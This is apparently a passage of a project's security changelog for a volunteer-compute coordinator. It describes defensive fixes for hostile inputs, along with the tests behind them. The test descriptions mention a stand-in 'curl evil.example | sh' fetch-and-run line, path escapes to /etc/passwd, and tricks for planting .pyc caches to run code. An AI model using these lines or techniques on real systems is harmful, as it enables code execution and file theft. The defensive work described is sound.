- **Views (code inside the file).** A table could be replaced by a view, and our checks read the view without noticing. Shown in a test: a copy whose `submissions` view returns the honest points until a date and adds 1,000 after it verified cleanly against the signed report, while the same kind of file with a past date failed. Same bytes, same sha256, different numbers depending on the reader's clock (or SQLite version, or `random()`). A view can also loop for hours. Now views, triggers and virtual tables are refused.
- **Exact schema:** only the tables `ledger_copy export` writes (the ledger's tables, `copy_info`, SQLite's own `sqlite_sequence`), with the same columns and types, and only the ledger's own indexes (same columns, not partial). The reference schema is built by the same `Ledger` code, so it can't drift.
- **Never changes the file:** opened `?mode=ro&immutable=1`, so a `-journal`, `-wal` or `-shm` beside the copy is ignored and no file is created or rewritten. Shown in a test: a crashed writer's hot journal beside a copy; a plain open rolls it back and changes the copy's sha256, the guarded open leaves both files byte for byte. A WAL-format copy run through `rewards verify`, `compare` and `publish_report` leaves no extra files.
- **Hardened connection:** `trusted_schema=OFF`, `cell_size_check=ON`, `mmap_size=0`, `query_only=ON`, no `ATTACH`, values over 1 MiB refused, and on Python 3.12+ defensive mode with views and triggers switched off at the connection; every connection is stopped after 300 s.
- **Intact:** `PRAGMA integrity_check` must say `ok` (catches an index that quietly disagrees with its table, which a table scan never sees), and every row of every table is read once up front.
- **Sizes and shapes:** a regular file, not empty, at most 512 MiB, starting with the SQLite header (anything else is refused before SQLite parses it); exactly one well-typed `copy_info` row (an empty `copy_info` used to crash with `TypeError`).
- **Where it's used:** `copy_info()` (so `publish_report`, `compare`, `rewards verify --db` and `ledger_copy info` all vet first), and `Ledger(path, untrusted=True)` for every read of a copy. `ledger_copy export` vets its own output before saving it, so an honest export can never produce a copy the tools refuse. `UnsafeCopyError` is a `sqlite3.DatabaseError`, so each tool prints one line (`refusing to read ...`, exit 2) instead of a traceback. Live ledgers (the operator's own, possibly mid-write in WAL mode) are still told apart from copies and opened as before.
- **Tests** (`tests/test_copy_guard.py`, 28): honest copies open and verify unchanged; time-bomb and endless views refused by every tool; 13 schema tricks (trigger, extra view or table, missing table, extra column, changed column type, extra, partial or changed index, zero, two or malformed `copy_info` rows); virtual table; flipped page, truncated file, header only, junk; an index that disagrees with its table; 2 MiB value; size cap; hot journal; WAL-format copy; a query that never ends is stopped; no writes or `ATTACH`; export vets its own output. Run on Python 3.13 (SQLite 3.53) and 3.11 (SQLite 3.45, no `setconfig`).
- 19 deliberate breakages of the guard; 12 caught by the first version of the tests, the other 7 only after adding tests (immutable open, integrity check, virtual tables, header check, `copy_info` types, and the hardened open in `rewards verify` and `compare`). The tests also caught a real bug in the guard itself: the size cap was read once at import time.

**Limits:** it makes reading a copy safe, not its numbers true (that's the signed report, `check_consistency` and `compare`). It can't protect against a bug inside SQLite itself beyond the hardening above, so keep Python up to date. The operator's own tools (`review`, `vouches`, `incident`) read the live ledger as before.

## Implemented: reading JSON files from strangers safely (0.5.55, `json-file-v1`)

Tested in software only. Fourth pass of the "code audit" item. Three tools read JSON someone else wrote: `rewards verify` (a signed report downloaded from /reports/ or anywhere else), `release verify` (a release's manifest, signature file and signer list) and `publish_report check` (the `reports/index.json` the website shows, re-checked by CI on every pull request). What was wrong and what changed:

- **A borrowed fingerprint passed.** The signature block in a report has a `fingerprint` field that is only a label: it isn't signed. `rewards verify --no-db` (without `--public-key`) printed that label as "signed by ...", and tells you to compare it with the coordinator's. Shown in a test: a report with changed points, signed by an attacker's own key, with the real coordinator's fingerprint pasted into the label, printed the real fingerprint and `OK`. Now the label must match the key that signed (else `MISMATCH`), and the tool prints the fingerprint it computes from the key. With `--public-key` (what the /reports/ page tells people to use) it was always refused.
- **The page's numbers were never checked.** `/reports/` shows each period's rigs, results, simulated points, scoring version, fingerprints, file sizes and "history unchanged" from `index.json`. `publish_report check` compared file hashes only, so an edited point total in a pull request passed CI. Now every shown value must equal what the signed report and copy say; the `coordinator` line must be the key that signed the newest period; each fingerprint must belong to its key; entries may hold only the fields `add` writes; `rule`, `notice` and `site` can't be changed.
- **Paths.** An index entry could name any path (`../../x`, `/etc/passwd`) and `check` would hash and open it. Now each period may only point at `<period>/report.json` and `<period>/ledger-copy.sqlite3`, and symlinked files or folders are refused.
- **New `app/json_file.py`**, used by all three tools: a regular file only (a named pipe used to hang the tool; `/dev/zero` filled memory), at most 4 MiB (reports 64 MiB, about 250,000 results), checked before reading and again while reading; strict UTF-8 with no byte-order mark; nested at most 32 deep (100,000 brackets used to crash with a `RecursionError`); no `NaN`/`Infinity`; no key written twice in one object (`"payable_points": 1, "payable_points": 9999` was quietly read as the second, and other programs may read the first). Errors are one line, with file names made safe to print.
- **No more tracebacks:** a top-level list, `null`, a list where `scoring` should be, a huge `period`, or entries that aren't objects used to crash `rewards verify`; now `MISMATCH` (exit 1) or `refusing to read it` (exit 2). `publish_report add` refuses to build on a damaged index instead of crashing.
- **Trailing newlines.** In Python `^abc$` also matches `"abc\n"`. Every hand-written `^...$` pattern in `app/` now ends in `\Z`; that closes a release signer name, commit hash or file hash with a hidden line break, and a log value with a line break being written raw into the log. A test fails if a new `$` pattern appears.
- **Tests** (`tests/test_json_file.py`, 59): 11 kinds of hostile file against the loader, `rewards verify` (with and without `--db`) and the release tools; pipes, devices, folders, a sparse 5 GB file (refused without reading a byte) and a file that grows while it is read; the borrowed-fingerprint report; control codes in labels, file names and keys; 7 wrong shapes inside a report; every shown index value edited one at a time; 3 fingerprint edits; 4 path escapes; 17 malformed index entries; a duplicated key in a published report even with all hashes updated to match. Run on Python 3.13 and 3.11.
- 31 deliberate breakages: 30 caught (5 only after adding tests: size checked before reading, growing file, byte-order-mark message, an older period's fingerprint, an entry listed twice). The one miss: printing the label instead of the computed fingerprint, which can't show anything different while the label check holds (a second layer).

**Limits:** it makes reading these files safe and the page's numbers match the signed files. It doesn't make a report true (the signature, consistency checks and `compare` do that), and a person still has to get the coordinator's key from somewhere they trust.

## Implemented: the coordinator against its own clock (0.5.65, `ledger-clock-v1`)

Tested in software only, plus a real uvicorn server on this sandbox. Fourteenth pass of the "code audit" item: everything in the ledger is ordered by the server's clock (when a job was created, when a result was accepted, which reward period it falls in). **What happens when that clock moves?** NTP steps it, a VM is restored from a snapshot, a board with no clock battery boots in 1970, 2000 or at the time it last shut down.

- **Shown before the fix** (`app/ledger_clock.py` docstring has the details):
  - **Clock set back 3 minutes** after period 1 was closed, signed and shared as a ledger copy: the next result was accepted *inside* period 1. The rebuilt period-1 report no longer matched the signed one, and `ledger_copy compare` on the next copy reported a back-dated job and three back-dated events. An honest operator looked exactly like one rewriting history.
  - **Real uvicorn server, real clock:** started on a ledger whose newest entry was 48 days ahead of the server clock (a ledger made on a machine whose clock was ahead). It started without a word and wrote a new job 48 days *before* the existing one.
  - **Reboot with the clock at 2000-01-01:** it started; a job a crashed rig was holding stayed `leased` with 27 years left on the lease, so no other rig could ever take it.
- **Fix: time never goes backwards in the ledger.** The coordinator's time is `max(server clock, newest time already written)`, never decreasing, read under a lock. If the clock is set back, the coordinator holds its time until the clock catches up; it still follows the clock forwards (a board that booted on an old clock must catch up when NTP corrects it, or honest rigs' results would look like they came from the future).
- **Refuses to start far behind the ledger:** more than `CLOCK_BEHIND_LIMIT_SECONDS` (default 300, allowed 0 to 7 days) behind the newest recorded time is a wrong clock, not passing time. The message gives both times in UTC and says what to do (fix the clock: `timedatectl`, NTP; or raise the limit on purpose). Real uvicorn on the same 48-days-ahead ledger now refuses with that message. An empty ledger starts at any time.
- **"Newest recorded time"** (`Ledger.latest_time()`) reads events, job creation and updates, accepted results, rigs registered/seen/revoked and enrollment codes made/used (an empty-queue poll writes no event but updates the rig's `last_seen_at`; that counts too). Deadlines and expiry times don't count.
- **Signing a reward report is now recorded** (`reward_report_signed` event, operator-only: no job id, never on a public page; detail `since`, `until`, `report_sha256`), from the API (`sign=true`) and from `python -m app.rewards report --sign`. Before, a quiet ledger (newest job at T, report for [0, T+900) signed at T+1000) could take a restart at T+800 and write into the signed period, because nothing in the ledger said T+1000 had happened. Unsigned or refused reports, and reports on a shared copy, write nothing. A copy of a period never holds its own signing event (it is written at or after `until`); the next copy does.
- **Steps noticed while running:** each reading compares how far the server clock moved with how far `time.monotonic` (which nobody can set) moved; a gap of `CLOCK_STEP_WARN_SECONDS` (default 60) or more is a step: logged (`server clock stepped`), counted, and the last 10 shown. Operator health has a new `clock` block (`coordinator_time`, `server_clock`, `held_seconds`, `held_at_start_seconds`, `steps_seen`, `recent_steps`) and warnings while time is held, after a jump ahead and after a set-back.
- **The operator's own tools follow the same rule:** `app.incident pause|resume`, `app.workers enroll|revoke`, `app.ledger_copy export` and `app.rewards report --sign` write with `max(server clock, newest recorded time)` and refuse (exit 2, nothing written) on a clock more than the limit behind. Read-only views (`incident status`, `workers list`, unsigned reports) still work on a wrong clock.
- **Proof:** `tests/test_ledger_clock.py` (22 tests, Python 3.13 and 3.11). 17 of them fail on the old code (the other 5 test the new clock module on its own). 16 deliberate breakages (no hold, hold ignoring the ledger at start, limit off by one, no start check, start check fed nothing, API or CLI signature not recorded, events or `last_seen_at` left out of the newest time, set-backs not noticed, CLI tools on the raw clock, held warning off, test clocks seen as stepping), all caught. Five older CLI tests now pin the CLI clock to the tests' fake clock (their ledgers live in January 2027; the CLI used the real clock, which is exactly the case this refuses).
- **Limits:** it can't tell a wrong clock from a right one going *forwards*. If the clock jumps a day ahead for a moment, leases and deadlines inside that day expire (shown, not prevented: a rig then gets `410 job expired`), and once the clock is set back the coordinator holds its time until real time catches up (a day of standing still; the health page says so). Up to `CLOCK_BEHIND_LIMIT_SECONDS` of hold after a restart is allowed on purpose, so a small correction doesn't stop the coordinator. Keep NTP running on the server.

## Implemented: what one rig can make the coordinator write (0.5.64, `refusal-log-v1`)

Tested in software only, plus a real uvicorn server on this sandbox. Thirteenth pass of the "code audit" item: what can **one enrolled rig** make the coordinator store, and what does that cost everyone who reads it later?

- **Shown before the fix:** every refused submission added a row to the audit trail: a result for a job someone else already finished (`submission_conflict`), for a job leased to another rig (`submission_wrong_worker`), or with a receipt that doesn't match the job (`receipt_mismatch`; the receipt is checked before the lease, so this works on *any* job id, and job ids are public on the ledger pages). Rig `wk-b` sent 3,000 refused submissions at `wk-a`'s finished job: **3,000 rows, 180 bytes each**. At the default limit of 240 requests a minute that is **345,600 rows (about 62 MB) a day, forever**, from one address. With a day of them on `wk-a`'s job, the public `GET /v1/jobs/{id}` for that job was **54 MB and took 1.5 s** per request.
- **Also found:** every accepted result looks up the sending rig's audit record to pick its re-check rate, and that query read every result ever accepted (no index on `submissions.worker_id`): about 10 ms per result at 100,000 results, growing with the ledger.
- **Fix:** the same refusal (same job, same rig, same reason) is written **once** (`Ledger._refusal`, looked up through `events_by_job`, so it reads only that job's few events). Repeats are counted in memory per rig (`Ledger.repeated_refusals()`), shown on operator health as `repeated_refusals` (`since_start`, `warn_at`), with a warning once a rig reaches 100 repeats (`REFUSAL_REPEAT_WARN`): usually a worker stuck in a retry loop, possibly someone probing. Different rigs, jobs and reasons still each get their own row; a rig re-sending its own accepted result is unchanged (`200`, nothing written); a wrong answer on a leased job still uses up an attempt each time.
- **Public job trail capped in the database:** `GET /v1/jobs/{id}` now filters private events and caps the list inside SQLite (`MAX_JOB_EVENTS` 200, oldest first) and adds `events_total` and `events_limit`. With repeats no longer written a job has a handful; the cap is a second fence for ledgers written before this version.
- **New index** `submissions_by_worker(worker_id, audit_status)` (`WORKER_INDEXES`, added on start to older ledgers): the per-result lookup is now 0.2 ms at 100,000 results. Exported copies carry it; older copies without it still open; a copy with a different index under that name is refused, as before.
- **Same server, same flood, after:** 3,000 refused submissions wrote **2 rows** (one per reason) and the database file didn't grow. `GET /v1/jobs/{id}` on an old ledger already holding a day of rows: 0.1 s and a few KB instead of 1.5 s and 54 MB.
- **Reward reports:** `activity.bad_submissions` now counts different refusals, not repeats. The report format and scoring are unchanged, and reports rebuilt from older ledgers give the same numbers as before (the rows already written stay).
- **Proof:** `tests/test_refusal_log.py` (19 tests, Python 3.13 and 3.11), including 400 refused submissions over real connections to a real server (200 at the same moment, 200 one after another) writing exactly 2 rows, and SQLite's own query plans for the new lookups. 16 fail on the old code. 15 deliberate breakages (repeat check skipped, reason or rig or job ignored in the lookup, counter not counted, old write path back, cap or private-event filter removed, newest-first order, index not created, warning threshold off by one, ...), all caught.
- **Limits:** repeats are counted in memory only (a restart clears the count, not the rule). A rig can still write one row per job and reason (at most 5 per job), so one rig could add about as many rows as the ledger already has jobs, once; revoking it stops that. Logs on stdout still get one line per refused request (your host's log rotation handles those). Many addresses still get many request buckets (threat model #17).

## Implemented: a big ledger stays cheap to read (0.5.63, `ledger-pages-v1`)

Tested in software only, plus a real uvicorn server on this sandbox over a ledger filled with 100,000 results. Twelfth pass of the "code audit" item: what do the routes **anyone** can call cost once the ledger is big?

- **Shown before the fix** (100,000 accepted results, about two months of two rigs finishing a job a minute): every `GET /v1/ledger` reply held every result ever accepted (20 MB) and re-ran the whole consistency check; one reply took **0.86 s** of the coordinator's time. One address asking four times a second, inside the 240-a-minute request limit, made a rig wait up to **7.8 s** for its next job (4.7 ms when quiet) and only 6 of the replies got out in 15 s. `GET /v1/jobs/{id}` read every event ever written to find one job's (22 ms, growing with the ledger).
- **Pages.** `GET /v1/ledger` entries now come in pages: `limit` (default 100, at most 1000), `order=oldest` (default) or `newest`, and `after`: pass the reply's `next_after` back to get the next page (`null` on the last one). A cursor is `<accepted_at>:<job_id>`, so results accepted in the same second are never skipped or repeated across a page boundary. `entries_count` is the total. Bad values get `422` without echoing what was sent. Same rows as before: no result hashes in public, confidence withheld during the settle delay. The operator view pages the same way.
- **Whole-ledger numbers once per window.** `total_simulated_points`, `points_by_status` and `consistency_problems` read the whole ledger, so the public reply now takes them once per `PUBLIC_COUNTS_INTERVAL_SECONDS` window, like the job counts (`totals_taken_at` says when; still with the public settle delay). With `X-Operator-Token` they are live. `PUBLIC_COUNTS_INTERVAL_SECONDS=0` makes them live for everyone again.
- **Indexes** (`SCALE_INDEXES`, added on start to older ledgers): `submissions(accepted_at, job_id)` for pages, `events(job_id, id)` for one job's trail, `jobs(audit_of)` for re-check lookups. Exported ledger copies carry them; older copies without them still open.
- **Rehearsal:** its paid-points and final consistency checks now read the operator's live view.
- **Same server, same burst, after:** public reply **9 ms** and 20 KB; the rig's waits didn't change (median 4.8 ms, worst 8.3 ms). With 500,000 results the public reply took 15 ms and one job's trail 5.5 ms.
- **Proof:** `tests/test_ledger_pages.py` (39 tests) plus one rehearsal test, Python 3.13 and 3.11: walking every page in both orders, same-second rows with and without the index, bad parameters, the window behaviour, and SQLite's own query plans for the public queries (so a later change can't bring back a whole-ledger read). 35 fail on the old code. 19 deliberate breakages, all caught.
- **Limits:** the first public ledger request in each window still runs the whole consistency check once (about 0.4 s at 100,000 results). The operator-only health page still reads the whole ledger (about 1 s at 100,000 results); it is behind the operator token. Many addresses still get many request buckets (threat model #17): put the coordinator behind a host with DDoS protection before it's public.

## Implemented: wrong tokens sent at the same moment (0.5.62, `guess-slot-v1`)

Tested in software only, plus a real burst against a real uvicorn server on this sandbox. Eleventh pass of the "code audit" item: what happens when requests arrive **at the same time**.

- **Shown before the fix:** the lock-out (`AUTH_FAILURE_LIMIT`, default 10 wrong tokens per `AUTH_FAILURE_WINDOW_SECONDS`) is checked when a request arrives, but a failure is only counted after the token has been compared. 230 requests with wrong `X-Operator-Token`s sent over 230 connections at once all got past the "locked out?" check before the first failure was counted: **all 230 were compared** (`403` each). An attacker could try up to a full request bucket (240) per burst instead of 10 per window.
- **Fix:** a request that carries `X-Operator-Token` or `X-Submitter-Token` takes a **guess slot** (`RateLimiter.start_guess`) before the endpoint runs and gives it back afterwards (`finish_guess`, in a `finally`, after the failure was recorded). Wrong tokens in the window plus slots in use may not go above the limit; a request without a free slot gets `429` (`too many login attempts at once from this address; try again in a moment`, `Retry-After` = the lock-out wait, or 1 s) and its token is never compared. The same burst now: **exactly 10 compared, 220 refused.**
- **Unchanged for rigs:** worker keys and enrollment codes are 256-bit random values nobody can guess, so they take no slot; 40 rig polls at the same moment are never refused. `/health` stays exempt even with a token header. An operator using the right token one request at a time is never slowed (50 in a row tested).
- **Operator health:** `rate_limits.since_start.guesses_refused_at_once` counts refusals.
- **Proof:** `tests/test_guess_slots.py` (16 tests, Python 3.13 and 3.11): bursts over real connections to a real server for both tokens, the lock-out afterwards, a crashing endpoint giving its slot back, a 50-thread race on the limiter itself. 11 fail on the old code. 15 deliberate breakages (no slot count, off-by-one, slot never given back, no `finally`, no lock, `/health` not exempt, rigs' keys taking slots, ...), all caught.
- **Limits:** in memory like the rest of the limiter (a restart clears it). A tool that sends more than `AUTH_FAILURE_LIMIT` operator requests at the very same moment would get `429` for the extra ones; ours send one at a time.

## Implemented: other people's text on the operator's screen (0.5.61, `operator-screen-v1`)

Tested in software only, plus a real run of the review queue on a real ledger. Tenth pass of the "code audit" item: the operator's read-only text views, and who else writes the text they print.

- **Shown before the fix:** rig `wk-b` submitted an answer holding terminal escape codes (clear screen, cursor home, rename the window, a bold fake line `Run: curl evil.example | sh`, the 8-bit CSI byte `\x9b`, a right-to-left mark and a bell). `python -m app.review --all` printed it raw: 5 ESC bytes and the CSI byte in its output. Any enrolled rig can get an answer into the review queue by disagreeing. Job inputs (from the submitter token) were printed the same way.
- **Also raw:** `ledger_copy info` (a stranger's copy's `note` and `format`), `ledger_copy compare` (rig, job and event names read from the copies), and names in `vouches`, `workers list` and `incident status`. Those names are checked on the way in since 0.5.52 (`input-limits-v1`) and pause reasons since `pause-v1`, but a ledger from before 0.5.52, or edited by hand, can hold anything. The site and dependency checkers quote website headers and OSV advisory text.
- **Fix:** new `app/screen.py` (imports only `typing`): `say` (moved from `worker_guard`, which re-exports it) and `say_lines`, which prints each line through `say`, so control codes and invisible marks become `?` and a line break inside a value can't fake a line of the tool's own. Used by all the views above. `review._short` cleans before it cuts, so a run of codes can't push the real text off the line.
- **Unchanged:** `--json` views, `ledger_copy compare --out` and the API keep the exact text (JSON writes ESC as `\u001b`, which a terminal doesn't act on), so you can still see exactly what a rig sent.
- **Proof:** `tests/test_operator_screen.py` (15 tests, Python 3.13 and 3.11): the real review CLI with a hostile rig; every string in a real review queue, vouch report and pause state poisoned at once; a hand-edited old rig name; a stranger's copy; the checkers' printouts. 12 fail on the old code. 15 deliberate breakages, all caught.
- **Limits:** this covers our own text views. If you pipe `--json` into another program that prints it decoded, that program needs the same care.

## Implemented: operator tools against a hostile coordinator (0.5.60, `operator-client-v1`)

Tested in software only, plus a real check against a fake coordinator on another address of this sandbox. Ninth pass of the "code audit" item: the two tools that send the **operator token** over the network, `app.challenge_pool issue|issue-leads` (which also sends each hidden test's **expected answer**) and `app.rehearsal --url`. The worker got guards against a hostile coordinator in 0.5.53; these tools didn't. New `app/operator_client.py`.

- **Shown before the fix**, with the old code against a fake coordinator at `http://192.0.2.2`: the operator token and the expected answer arrived in plain text; a 1 MB gzip reply was unpacked to 1 GB (2.2 GB of memory) and the test was then counted as *issued* with job id `None`; a reply that never ended was read until the machine killed the tool (about 6 GB); an error message cleared the screen, changed the window title and printed a fake `Refusing: run ... | sh` line; a reply nested 200,000 brackets deep crashed it with a traceback.
- **URL:** `https://` anywhere, `http://` only to this machine; another address needs `--allow-plain-http` (a test lab you control). No user name or password in the URL. Checked before anything is sent; a refused URL exits 2 and leaves the pool file untouched.
- **Replies** (`OperatorClient`, an `httpx.Client`, so the tools' code reads the same): never follows redirects, asks for and accepts only uncompressed replies, at most 8 MiB, whole reply within 60 s (`worker_guard.read_limited`, now shared with the worker). Breaking a limit is a `ReplyRefused` (an `httpx.HTTPError`), so the pool's existing rule applies: the test stays crossed off, because it may have been queued. `response.json()` refuses JSON nested deeper than 32 levels, `NaN`/`Infinity` and huge numbers (`UnsafeJSON`, a `ValueError`).
- **What the tools believe:** `issue` counts a test as issued only with a job id in the coordinator's own shape (`[A-Za-z0-9_-]{1,80}`); otherwise it's *unknown* and stays used. `issue-leads` checks the vouch check before sending anything: every rig name in the coordinator's own shape, no rig listed twice, task types a list of names (unknown ones dropped, since the pool has no tests for them). The rehearsal refuses a job id it would put into a URL path, and stops with a one-line reason (not a traceback) on a reply in the wrong shape.
- **What they print:** the coordinator's messages go through `worker_guard.say()` (control and invisible characters become `?`, cut to 200 characters), in `issue`, `issue-leads` and the rehearsal summary.
- **Proof:** `tests/test_operator_client.py` (72 tests, Python 3.13 and 3.11), including the honest path end to end (the pool and the full rehearsal through `OperatorClient` against an in-process coordinator, all checks passing). 34 of them fail on the old tool code. 26 deliberate breakages, 24 caught; the 2 missed are second layers in the rehearsal (the summary already cleans what it prints, and the report file is JSON, which escapes control characters). One check turned out to be redundant (`follow_redirects=False` set twice) and was removed.
- **Limits:** https proves you reached *a* server with a valid certificate for that name, not that it's your coordinator; keep the URL right. The operator token still lives in the operator's environment. Local `--local` rehearsals use the in-process client as before.

## Implemented: secret and pinned files on disk (0.5.59, `secret-file-v1`)

Tested in software only, plus one real check with a second ordinary account on this sandbox. Eighth pass of the "code audit" item: who else on the same machine can read or change the files our programs keep. One place for the rules: `app/secret_file.py`.

- **The ledger was readable by every user.** SQLite creates its file with the usual permissions (0644), and `data/prototype.sqlite3` holds every hidden test's expected answer, who it's aimed at, job inputs and key hashes. **Shown for real:** as the `nobody` account, copying the ledger and reading it printed the hidden test's answer. Now the coordinator creates the `data/` folder owner-only (0700) and an empty owner-only ledger (0600) before SQLite opens it, so SQLite's `-wal` and `-shm` side files are owner-only too. The same `nobody` check now gets `Permission denied`. An existing ledger, side file or folder that other users can read or change makes the coordinator stop with the fix (`chmod 600 <file>` or `chmod 700 <folder>`). Read-only opens and other people's ledger copies are unchanged.
- **The worker's key and pins.** `data/worker-<id>.key` was used whoever could read it (the coordinator's signing key already had that check). `data/coordinator.pub` and `data/coordinator-handover.pub` were trusted whoever could change them: in a folder anyone can write to, another user can delete the pin and put their own coordinator's key there (replayed in the tests). Now the worker stops, before sending its key anywhere, if the key can be read by others, a pin can be changed by others, the folder can be changed by others, or the file doesn't hold a key of the right shape. New keys and pins are 0600 in a 0700 folder; an existing ordinary `data/` folder (0755) keeps working and is never changed.
- **Pipes and look-then-read.** A named pipe in place of the worker key, a pin or the signing key hung the program forever. The signing key's permission check looked at the path, then read the file again by name. Now each file is opened once without blocking and checked on that open file: a regular file, owned by you (or root), at most 64 KiB read, and plain ASCII for keys.
- **Writing.** New key files are created with `O_EXCL` and `O_NOFOLLOW` (never over an existing file or through a planted link) and flushed to disk; a pin is replaced by writing an owner-only temporary file and renaming it (a link planted at the temporary name is removed, not followed).
- **Tests** (`tests/test_secret_files.py`, 41): each finding replayed, including the real second-account check (runs only as root with `setpriv`; skipped in CI). 18 of the behaviour tests fail on the old code. 20 deliberate breakages, 19 caught (writing the pin in place instead of swapping it differs only on a crash mid-write). Five older tests now create their fixture ledgers and keys owner-only.

**Limits:** this protects against other accounts on the same machine and against mistakes (a key copied with the wrong permissions, a key put in a shared folder). Root, or anything running as your own user, can still read everything. On Windows only the plain-file and size checks apply. The handover key's folder isn't checked, because it may sit on a USB stick.

## Implemented: fetching and pinning model files safely (0.5.58, `model-fetch-v1`)

Tested in software only; no model has been downloaded for real. Seventh pass of the "code audit" item. Pinning the first model is the next step on the rig, and that file comes from the internet. What was wrong and what changed (`app/model_registry.py`):

- **No limits on the download.** It had no size limit, an overall time limit only per read (a server sending a byte a minute kept it going for ever), followed redirects anywhere, including from https to plain `http://`, and let httpx unpack compressed replies. **Shown with a real local HTTPS server:** a redirect to plain http was followed and the old code wrote **3.2 GB in 6 seconds** (still going when stopped); an endless reply wrote 2.5 GB. Now: at most 5 redirects, each https with no user name or password; only uncompressed replies (`Accept-Encoding: identity` sent, any `Content-Encoding` refused); a declared size over the limit (or, for a pinned model, not the pinned size) is refused before reading; otherwise it stops while reading once it passes the limit (pinned: the pinned size; unpinned: `--max-mb`, or twice the registry's `approx_size_mb`, at least 64 MiB; never over 8 GiB); a reply shorter than it said is refused; anything but `200` is refused; the whole download must finish within `--deadline-minutes` (default 60); free disk space is checked first (size plus 512 MiB). The same server and new code: the http redirect refused before any body was read, the endless reply stopped at 64 MiB, nothing left on disk.
- **The first download was checked against nothing**, and `pin` then trusted whatever had arrived. Now `download` and `pin` take `--expect-sha256` (the sha256 the model page shows; `SHA256:` prefixes and capitals are fine). The download hashes while it writes and deletes a file that doesn't match. Without it, `download` says `NOT CHECKED` in capitals; the `pin` command needs `--expect-sha256` or an explicit `--no-expected-hash`.
- **Files on disk.** The download wrote to `<name>.part` opened by name (a link planted there made it write into another file) and replaced any existing file at the end. Now it writes to a fresh, randomly named temporary file in the target folder, moves it into place with a hard link that fails if a file of that name already exists (a link or file there is left alone and reported), and always removes the temporary file. A file that already matches the pin isn't downloaded again.
- **The registry.** `file_name` was joined to the model folder unchecked (`../../.bashrc` would have done), a missing field crashed with a traceback, a typo like `sha265` silently left a model unpinned, and `pin` rewrote the file in place and changed an existing pin without a word. Now the registry is read through `app/json_file.py` (1 MiB, no key twice) and every field is checked: plain file names ending `.gguf`, https URLs, 64-character lowercase hex hashes, whole-number sizes, sha256 and size both set or both empty, no unknown fields (except comments starting `_`), no model id or file name twice. Problems are one line (exit code 2), and a damaged registry makes the worker stop offering `llm:generate` and the coordinator refuse those jobs (`422`) instead of crashing. `pin` refuses to change an existing pin without `--replace` and writes the registry atomically (a crash leaves the old file).
- **Hashing** goes through one open file: regular files only (a named pipe given as the model hung it), size checked against the pin before hashing, and the bytes hashed must equal the size seen when it was opened. A model kept on another disk behind a link still works (the hash is what's trusted).
- **Tests** (`tests/test_model_fetch.py`, 100): every server trick above played back through httpx's `MockTransport` (no network), 38 bad registry fields and 8 bad shapes, pipes, links, crashes while pinning, the CLI. Run on Python 3.13 and 3.11. 25 deliberate breakages of the new code, 25 caught. A real run against a local HTTPS server with a 5 MB file: downloaded and checked with `--expect-sha256`, a wrong hash refused and deleted, pinned, a second download skipped as already present, `verify` ok.

**Limits:** a sha256 from the model page shows the file wasn't changed on the way, not that the publisher's file is honest. Someone who can write to the model folder could still swap the file between the worker's check and llama-cli opening it. Proxy settings (`HTTPS_PROXY`) are honoured, as before.

## Implemented: checking a release folder for planted code (0.5.57, `release-folder-v1`)

Tested in software only. Sixth pass of the "code audit" item. The Stay Safe page tells people to run `python -m app.release verify release.json --signers signers.json --root .` on a download before running it, so the folder it checks is something a stranger handed over. Python runs more than `.py` files, and `verify` only looked for extra `.py`/`.pth` files and skipped `__pycache__`. Three planted files passed `verify` (it printed OK) and then **ran their code** when the worker started (`python -m app.worker`):

- **A sourceless `json.pyc` next to the code.** `python -m` puts the folder first on Python's search path, so a compiled `json.pyc` (or `hashlib.so`, or a `json/` folder holding only `__init__.pyc`) is imported instead of the standard library's `json`. `.pyc` files were skipped and `.so` files counted as harmless "extra files".
- **A `__pycache__/worker.cpython-313.pyc` with other code inside.** Python trusts a cache file whose header carries the source's modification time and size, and runs it *instead of* the source. A download can set any time it likes. The signed, unchanged `worker.py` checked out fine; the cache beside it ran.
- **A linked folder named like a module** (`json -> /somewhere/evil`). The folder walk didn't follow links, so it never saw what was behind it; Python does follow them.

What changed (`app/release.py`, `check_files`):
- **Anything Python could import that isn't in the release is a problem**: every ending this Python can load (`importlib.machinery.all_suffixes()`: `.py`, `.pyc`, `.so`, `.cpython-313-…so`, `.abi3.so`) plus `.pth`, `.pyw`, `.pyd`, `.pyo`, anywhere outside the skipped folders. A test fails if Python ever adds an ending the list doesn't cover.
- **Links** not in the release are problems (a linked `data/` is still fine: it's skipped and never imported). **A folder it can't read** is a problem instead of a silent skip (it can't promise there's no code inside). More than 100,000 entries stops with a problem.
- **Caches are checked, not skipped.** Each `__pycache__/<name>.<tag>[.opt-N].pyc` whose source is in the release must be byte-for-byte what this Python builds from the already-checked source (same header layout: time + size, or a source hash for "checked"/"unchecked" caches; same compiled code). Cache bytes are only compared, never unpacked (Python's `marshal` isn't safe on hostile data). Caches from another Python version can't be compared, so they're one problem line per folder. Names Python never looks up (pytest's own rewrite caches, modules no longer in the release) are one note.
- **The fix is always the same and always safe:** delete the `__pycache__` folders and check again; Python rebuilds them from the checked source. Caches built in another folder (a moved checkout) also fail the byte check, which is the safe direction.
- **Listed files** are opened without following a final link and without blocking on a pipe or device, and at most the signed size plus one byte is read. **Printing:** every problem and note goes through `say()`, so file names with terminal codes or invalid UTF-8 can't clear the screen or crash the printout. **Versions** with spaces, line breaks or other hidden characters are refused.
- **Tests** (`tests/test_release_folder.py`, 53): each of the three holes is shown to really run code with the old check, then caught; honest caches made by Python itself (`-O`, `-OO`, timestamp, checked-hash and unchecked-hash) pass; 10 kinds of damaged or odd cache; every importable ending at the top and in `app/`; links to files, folders and cache folders; an unreadable folder (simulated, and for real as a non-root user); a 5 GB sparse file never read; a pipe; hostile names. Run on Python 3.13 and 3.11.
- **Shown against the old code:** 47 of the new tests fail on it, including all three holes. 17 deliberate breakages of the new code: all caught (two first runs exposed redundant checks, now removed). Tried on this repo's own `prototype/` folder with throwaway keys: OK with 42 caches Python built itself, after clearing caches a Python 3.11 run had left (flagged, as designed).

**Limits:** it checks the folder at the moment you run it; something that changes the folder afterwards isn't seen. It covers what Python imports from the release folder, not your installed packages (`requirements.lock` hashes those), `PYTHONPATH`, or llama.cpp and model files. `data/`, `venv` and `node_modules` are still skipped (nothing imports them by name). No signed release exists yet.

## Implemented: reading rig reports safely (0.5.56, `rig-report-v1`)

Tested in software only. Fifth pass of the "code audit" item. `python -m app.phase3_check` reads an inventory (`hw_inventory`) and run reports (`gpu_run`) that will come from volunteers' rigs, by chat or email, so they are files from strangers too. What was wrong and what changed:

